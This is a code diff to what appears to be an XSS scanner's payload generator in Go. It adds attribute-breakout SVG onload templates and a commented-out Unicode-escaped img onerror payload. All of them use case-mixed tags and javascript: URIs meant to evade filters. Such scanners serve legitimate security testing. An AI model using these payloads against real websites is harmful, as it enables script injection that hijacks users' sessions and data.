@@ -50,11 +50,14 @@ func RandStringRunes(n int) string {
 var (
 	script_payload string = "<ScRiPt>%s</sCrIpT>"
 	img_payload    string = "<iMg SrC=1 oNeRrOr=%s>"
+	//img_payload1   string = "\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u002f\u0064\u006f\u006d\u002d\u0078\u0073\u0073\u002f\u0029"
 	href_payload   string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
 	svg_payload    string = "<sVg/OnLoAd=%s>"
 	iframe_payload string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
 	input_payload  string = "<input autofocus onfocus=%s>"
 	svg_payload1   string = "><sVg/OnLoAd=%s>"
+	svg_payload2   string = "\"><sVg/OnLoAd=%s>"
+	svg_payload3   string = "'><sVg/OnLoAd=%s>"
 )
 
 var (
@@ -199,7 +202,9 @@ func (g *Generator) GeneratorPayload(Tagmode int, flag string, extension interfa
 			svg_payload,
 			iframe_payload,
 			input_payload,
-			svg_payload1}
+			svg_payload1,
+			svg_payload2,
+			svg_payload3}
 		g.words = append(g.words, htmlpayload...)
 		g.mapmode(CheckValue, true)
 	} else if Comment == Tagmode {
@@ -216,7 +221,9 @@ func (g *Generator) GeneratorPayload(Tagmode int, flag string, extension interfa
 					svg_payload,
 					iframe_payload,
 					input_payload,
-					svg_payload1}
+					svg_payload1,
+					svg_payload2,
+					svg_payload3}
 				g.words = append(g.words, KeyPayload...)
 				g.mapmode(CheckValue, true)
 			} else if funk.Contains(s.Type, "value") {
@@ -228,7 +235,9 @@ func (g *Generator) GeneratorPayload(Tagmode int, flag string, extension interfa
 						svg_payload,
 						iframe_payload,
 						input_payload,
-						svg_payload1}
+						svg_payload1,
+						svg_payload2,
+						svg_payload3}
 					newValuePayload := funk.Map(ValuePayload, func(payload string) string {
 						Lstr := strings.Replace(payload, "<", "%26lt;", -1)
 						Rstr := strings.Replace(Lstr, ">", "%26gt;", -1)
